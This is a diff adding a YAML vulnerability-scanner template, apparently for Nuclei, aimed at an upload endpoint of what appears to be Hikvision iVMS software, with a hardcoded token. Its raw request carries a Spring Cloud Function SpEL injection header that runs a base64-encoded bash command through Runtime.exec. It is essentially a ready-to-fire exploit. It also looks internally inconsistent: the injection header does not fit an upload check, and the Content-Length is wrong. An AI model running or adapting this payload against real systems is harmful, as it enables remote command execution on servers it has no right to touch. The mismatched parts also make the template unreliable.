@@ -1,0 +1,32 @@
+id: haikang-ivms-upload
+
+info:
+  name: haikang upload
+  author: Str1am
+  severity: critical
+  tags: haikang,upload
+
+requests:
+  - raw:
+      - |
+        POST /eps/api/resourceOperations/upload?token=16B58FBD17E34E08E7292ACFFF3636A3 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+        Accept-Encoding:gzip,deflate
+        spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c {echo,d2hvbWFp}|{base64,-d}|{bash,-i}")
+        Content-Length: 3
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        service=https://www.baidu.com
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "errorCode"
+          - "errorMessage"
+          - "token invalid"
+        part: body
+        condition: and
